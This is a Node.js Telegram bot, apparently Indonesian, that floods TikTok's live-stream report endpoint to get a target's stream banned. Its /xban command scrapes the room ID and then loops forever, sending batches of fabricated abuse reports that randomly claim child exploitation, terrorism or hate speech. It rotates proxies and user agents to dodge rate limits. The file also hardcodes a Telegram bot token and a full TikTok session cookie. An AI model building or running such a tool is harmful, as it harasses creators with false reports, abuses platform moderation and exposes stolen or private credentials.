const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Konfigurasi Bot & Kredensial
const BOT_TOKEN = '9045319876:AAE9I3rNIsnSDfoA66crqraowirf-EFXgJ0';
const ADMIN_CHAT_ID = '8637044889';

const bot = new Telegraf(BOT_TOKEN);

// Cookie TikTok Asli dari user
const TIKTOK_COOKIE = 'delay_guest_mode_vid=5;last_visited_page=%7B%22lastPage%22%3A%22personal_homepage%22%2C%22lastPageAt%22%3A1794762449268%7D;tt-target-idc-sign=TcBVHMnARmnwwLxYi0Os9dJ3Ac_J4kB8Cq3z8IOY_ryZ36lv5NdpEZqEidgKVzgaQ4byVGouUG7xwfENeTZqLnFHdguFj3OpUGt-SrdX3x-TX2v7r4Iox6j0vNPXccRXbOHk3xrEiuUTZGNxi2CmpYsbw68sxgViAL-DYF3coMj7OEz0ijb27LGPVZit6-_eUXBQLbvOukLOOYt5g7-yaxFt_PbdheatZZDkwIR94Z0_bkdDBxYxPGqt3Qt7FSBlPavGvZbAZ88cwcL8j-_zRGomwIjMXOOgLn1DfjJzs46BBZYSwcfnntQx8Q1_5PhBxG2iGlwaBwP6V5W4UsPUB1sHeVt_Xm4XWQgog6iG3y6F3lO_dwOpmz0DssWy5tX0HNrjIt1SVL6NCZmIEtacntJh8DxoGTCVZ7JViXQDmEvadiF-l8LduUanYHIJh797uD6sbaXfGRBqrGhfNsnvy3YYY6L5XwEXOTZs6tq4HqqUyj4KqKmHeDIzQrmQyGCT;living_user_id=569851873889;msToken=jEFh4qXUd7dfiAzjk00asGO-1O5HyEcBe9LEHsDlIXsxVD8y9JwFwrs8lo0MVGzx_ioGIdkrmd1cBJWBVxB8YcjxR50HsJe8MPg3U7-cFbK7OCUqMrOCwErIVd34YEHvcBw1tOj99YaNRaf8HCoYyWXd5Gh0vfYtGZOBi1iVFfU=;tt_session_tlb_tag=sttt%7C4%7CQDZzTI5C-GmoEm_WkiaDuv_________3XsI_YfkKU7HloU7C82J-tAespbq9BL-w8ZYnPlpkVOQ%3D;sid_guard=4036734c8e42f869a8126fd6922683ba%7C1794755689%7C15552000%7CFri%2C+14-May-2027+15%3A14%3A49+GMT;ttwid=1%7CrJrGEL9OQKKb5ob_qtid6Z7AY8fdLBlZxjSVAMwnHAE%7C1794762442%7Cb1a7bc4dacb1b34354c008b38b339a548323b4e902f77d5cb5afb60ff98b60bb;tt_ticket_guard_has_set_public_key=1;store-country-code-src=uid;perf_feed_cache={%22expireTimestamp%22:1795359600000%2C%22itemIds%22:[%227689422555328843015%22%2C%227694786938368183573%22%2C%227704376297740422418%22]};uid_tt=9c7670022168aa5dce002fe64bf714fec6c998bc646af3807cc43427fb46ec0e;store-country-sign=MEIEDLNAm2QIbq4PT0vjoAQgT0baDxzujFNhXHSRBTjSXhh2AXNnWpqWuXl36ElIZxQEEK2TDLzn801nKYK8vJJ31Q4;store-idc=alisg;ssid_ucp_v1=1.0.1-KDI5YTllZjliN2VmN2ZlZDJhMWMxNzQ5ZWYwNDMwZGQ0MjVmZjg3OGMKIgiBiI7u1Lv1oWoQ6Zjn1wYYswsgDDDyq4_SBjgBQOoHSAQQAxoDc2cxIiA0MDM2NzM0YzhlNDJmODY5YTgxMjZmZDY5MjI2ODNiYTJOCiAwNIcrLWFkue590rp6FaDcy-D6DkEkMiBABqBNP1VNXhIgjIz89Ra8Sk7U3d_gMShi0BzFhdujhMt8XWNiFcJScIcYAyIGdGlrdG9r;tiktok_webapp_theme=dark;_waftokenid=eyJ2Ijp7ImEiOiJtNTcrdGFpS0YrQ1pNYVJyb3d1RDYvME9TbHZ6bnhsUlFqZ0VQTlNrQ2Y0PSIsImIiOjE3OTQ3NjI0MjIsImMiOiJ3cVpYcnh1ekJlb3EvVVZHT0FIWW9DRER4Z041TCsrRDhlZTBRZjJwek9FPSJ9LCJzIjoiYUdNcms1UjQ2TW8rTEdTbkdCVm1uNDAxZ3JUYTd0NkhYbnpVcmZpdk5wRT0ifQ;cmpl_token=AgQYAPOg_hfkTtK6fTt6xfFdOPCSnp2d2P-DK2Cr9uY;d_ticket=c39722e883bbc5c9e65b1dd904870b8ea983c;fblo_1862952583919182=y;last_login_method=email;multi_sids=7704926800665543700%3A01392e60d497e3a82bf94126c65e2417%7C7657198937929122817%3A4036734c8e42f869a8126fd6922683ba;odin_tt=582e3d3e22a3ff26dacd185109fb8c5dba0728ccd7dcaf3c4a15802aa69d8212a222dc4b31c81ad85b7a1ad2ccbaa434b4ceae796b1f6d78b37d68758dc02ed5;passport_fe_beating_status=false;sessionid=4036734c8e42f869a8126fd6922683ba;sessionid_ss=4036734c8e42f869a8126fd6922683ba;sid_tt=4036734c8e42f869a8126fd6922683ba;sid_ucp_v1=1.0.1-KDI5YTllZjliN2VmN2ZlZDJhMWMxNzQ5ZWYwNDMwZGQ0MjVmZjg3OGMKIgiBiI7u1Lv1oWoQ6Zjn1wYYswsgDDDyq4_SBjgBQOoHSAQQAxoDc2cxIiA0MDM2NzM0YzhlNDJmODY5YTgxMjZmZDY5MjI2ODNiYTJOCiAwNIcrLWFkue590rp6FaDcy-D6DkEkMiBABqBNP1VNXhIgjIz89Ra8Sk7U3d_gMShi0BzFhdujhMt8XWNiFcJScIcYAyIGdGlrdG9r;store-country-code=id;tiktok_webapp_theme_source=auto;tt-target-idc=alisg;tt_chain_token=Vnj9e5s1LAr2G4opRznO0A==;tt_csrf_token=QYzOzw9r-8CMFNt-S76eO_HTVL99C3FjwV1Q;uid_tt_ss=9c7670022168aa5dce002fe64bf714fec6c998bc646af3807cc43427fb46ec0e';

// Daftar Alasan Report Takedown Permanen (TOS Violation)
const REASONS = [
    "Severe hate speech, harassment, and cyberbullying violation",
    "Dangerous activities, self-harm encouragement, and hazardous stunts",
    "Explicit adult content, nudity, and sexual solicitation in live broadcast",
    "Minors exploitation, endangerment, and safety guidelines violation",
    "Fraudulent activities, scams, financial deception, and unauthorized sales",
    "Terrorism promotion, violent extremism, and illegal organization support",
    "Intellectual property infringement and copyright violation TOS breach"
];

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 TikTok",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
];

let activeProxies = [];
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function fetchProxyList() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt', { timeout: 10000 });
        if (response.data) {
            const lines = response.data.split('\n');
            activeProxies = lines.map(p => p.trim()).filter(p => p.length > 0 && (p.startsWith('http') || p.includes(':')));
        }
    } catch (error) {}
}

fetchProxyList();
setInterval(fetchProxyList, 30 * 60 * 1000);

function getSystemInfo() {
    const now = new Date();
    const optionsTime = { timeZone: 'Asia/Jakarta', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
    const optionsDate = { timeZone: 'Asia/Jakarta', weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
    
    return {
        time: new Intl.DateTimeFormat('id-ID', optionsTime).format(now),
        date: new Intl.DateTimeFormat('id-ID', optionsDate).format(now),
        weather: "🌧️ 28°C (Hujan Ringan / Lembab)",
        region: "Indonesia (WIB)"
    };
}

async function getRoomId(url) {
    try {
        let targetUrl = url.trim();
        if (!targetUrl.startsWith('http')) {
            targetUrl = 'https://' + targetUrl;
        }

        const urlParams = new URL(targetUrl).searchParams;
        if (urlParams.has('room_id')) {
            return urlParams.get('room_id');
        }

        const response = await axios.get(targetUrl, {
            headers: {
                'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                'Cookie': TIKTOK_COOKIE,
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            },
            maxRedirects: 5,
            timeout: 8000
        });

        const html = response.data;
        const patterns = [
            /"roomId\\?":\\?"(\d+)\\?"/,
            /"room_id\\?":\\?"(\d+)\\?"/,
            /room_id["']?\s*[:=]\s*["']?(\d+)/,
            /roomId["']?\s*[:=]\s*["']?(\d+)/,
            /"webcastRoomId"\s*:\s*"(\d+)"/
        ];

        for (let pattern of patterns) {
            const match = html.match(pattern);
            if (match && match[1]) {
                return match[1];
            }
        }

        const fallbackMatch = html.match(/"(\d{15,20})"/);
        if (fallbackMatch) {
            return fallbackMatch[1];
        }

        return null;
    } catch (error) {
        return null;
    }
}

// Konfigurasi Keyboard Navigasi Bersih Tanpa Karakter Tersembunyi
const mainKeyboard = Markup.keyboard([
    ['🚀 START TEKDWON REPORT', '📊 STATUS EXECUTOR'],
    ['⚙️ INFO SYSTEM & CUACA', '🔥 HELP / PANDUAN']
]).resize();

// Handler Command /start
bot.start((ctx) => {
    const info = getSystemInfo();
    const menuText = `
╔══════════════════════════════╗
║     ⚡ **DGXEONHOZOOMD** ⚡     ║
║   TIKTOK LIVE BANNED ENGINE    ║
╚══════════════════════════════╝

👋 Halo, **Executor DGXEONHOZOOMD**!
📅 Hari/Tanggal: \`${info.date}\`
⏰ Waktu WIB: \`${info.time}\`
🌍 Wilayah: \`${info.region}\`
🌤️ Info Cuaca: \`${info.weather}\`

📌 **Cara Penggunaan:**
Ketik perintah atau gunakan tombol di bawah:
\`/xban <link_live_tiktok>\`

_Status Bot:_ **ONLINE & READY** ⚡
    `;
    ctx.replyWithMarkdown(menuText, mainKeyboard);
});

// Handler Tombol Navigasi (Sudah dibersihkan dari spasi tak kasat mata)
bot.hears('🚀 START TEKDWON REPORT', (ctx) => {
    ctx.reply("⚡ Silakan masukkan format perintah:\n`/xban <link_live_tiktok>`", { parse_mode: 'Markdown', ...mainKeyboard });
});

bot.hears('📊 STATUS EXECUTOR', (ctx) => {
    ctx.reply(`📊 **STATUS EXECUTOR DGXEONHOZOOMD**\n\n- Bot Engine: **Active (Node.js)**\n- Proxy Pool Loaded: **${activeProxies.length} Proxies**\n- Target Status: **Ready to Take Down**\n- Mode: **Infinite Loop Flood / Multi-Threaded**`, { parse_mode: 'Markdown', ...mainKeyboard });
});

bot.hears('⚙️ INFO SYSTEM & CUACA', (ctx) => {
    const info = getSystemInfo();
    ctx.reply(`⚙️ **INFORMASI SYSTEM & ENVIRONMENT**\n\n⏰ Jam Server: \`${info.time} WIB\`\n📅 Tanggal: \`${info.date}\`\n🌤️ Cuaca: \`${info.weather}\`\n🛡️ Cookie Status: **Connected & Authenticated**`, { parse_mode: 'Markdown', ...mainKeyboard });
});

bot.hears('🔥 HELP / PANDUAN', (ctx) => {
    ctx.reply(`🔥 **PANDUAN EKSEKUSI BAN PERMANEN**\n\n1. Ambil link live streaming TikTok target.\n2. Kirim perintah \`/xban <link_live>\`.\n3. Bot akan menjalankan **Animasi Loading 0% - 100%** & laporan massal TOS tanpa henti.`, { parse_mode: 'Markdown', ...mainKeyboard });
});

// Handler Command /xban <link> dengan Animasi Loading 0% - 100%
bot.command('xban', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply("❌ **Format Salah!**\nGunakan: `/xban <link_live_tiktok>`", { parse_mode: 'Markdown' });
    }

    const liveLink = args[1];
    const statusMsg = await ctx.reply("🔄 **[DGXEONHOZOOMD]** Menghubungkan ke server TikTok & Menganalisis Link...", { parse_mode: 'Markdown' });

    const loadingSteps = [
        "[░░░░░░░░░░] 0% - Menginisialisasi Executor...",
        "[██░░░░░░░░] 20% - Memuat Cookie & User-Agents...",
        "[████░░░░░░] 40% - Mengambil & Parsing Room ID Target...",
        "[██████░░░░] 60% - Menghubungkan ke Free Proxy List (GitHub)...",
        "[████████░░] 80% - Menyiapkan Payload TOS Violation...",
        "[██████████] 100% - Target Terkunci! Memulai Serangan..."
    ];

    for (let step of loadingSteps) {
        await sleep(400);
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, `⚡ **[DGXEONHOZOOMD LOADING ANIMATION]**\n\n${step}`, { parse_mode: 'Markdown' });
        } catch (e) {}
    }

    const roomId = await getRoomId(liveLink);

    if (!roomId) {
        return ctx.telegram.editMessageText(
            ctx.chat.id, 
            statusMsg.message_id, 
            null, 
            "❌ **[ERROR]** Gagal mendapatkan Room ID! Pastikan link live streaming TikTok aktif.", 
            { parse_mode: 'Markdown' }
        );
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id, 
        statusMsg.message_id, 
        null, 
        `✅ **[SUCCESS 100%]** Target Room ID Ditemukan: \`${roomId}\`\n🔥 **DGXEONHOZOOMD MENJALANKAN REPORT TANPA BERHENTI (TOS BAN BATCH)...**`, 
        { parse_mode: 'Markdown' }
    );

    setImmediate(async () => {
        let globalCounter = 0;
        
        while (true) {
            const batchPromises = [];

            for (let i = 0; i < 10; i++) {
                globalCounter++;
                const currentId = globalCounter;
                const randomReason = REASONS[Math.floor(Math.random() * REASONS.length)];
                const randomUA = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
                
                let proxyUrl = null;
                if (activeProxies.length > 0) {
                    const rawProxy = activeProxies[Math.floor(Math.random() * activeProxies.length)];
                    proxyUrl = rawProxy.startsWith('http') ? rawProxy : `http://${rawProxy}`;
                }

                const axiosConfig = {
                    headers: {
                        'User-Agent': randomUA,
                        'Cookie': TIKTOK_COOKIE,
                        'Content-Type': 'application/json',
                        'Referer': liveLink,
                        'X-Sec-Uid': ''
                    },
                    timeout: 4000
                };

                if (proxyUrl) {
                    try {
                        axiosConfig.httpsAgent = new HttpsProxyAgent(proxyUrl);
                        axiosConfig.proxy = false;
                    } catch (e) {}
                }

                const payload = {
                    room_id: roomId,
                    report_type: 4,
                    target_type: 1,
                    reason: randomReason,
                    source: "live_stream_report"
                };

                const requestPromise = axios.post(`https://webcast.tiktokv.com/webcast/room/report/?room_id=${roomId}`, payload, axiosConfig)
                .then(() => {
                    console.log(`[DGXEONHOZOOMD HIT #${currentId}] Room: ${roomId} | Proxy: ${proxyUrl || 'Direct'}`);
                }).catch(() => {});

                batchPromises.push(requestPromise);
            }

            await Promise.all(batchPromises);
            await sleep(200); 
        }
    });
});

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (reason, promise) => {});

bot.launch().then(() => {
    console.log("🤖 Bot Telegram DGXEONHOZOOMD Berhasil Dijalankan!");
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
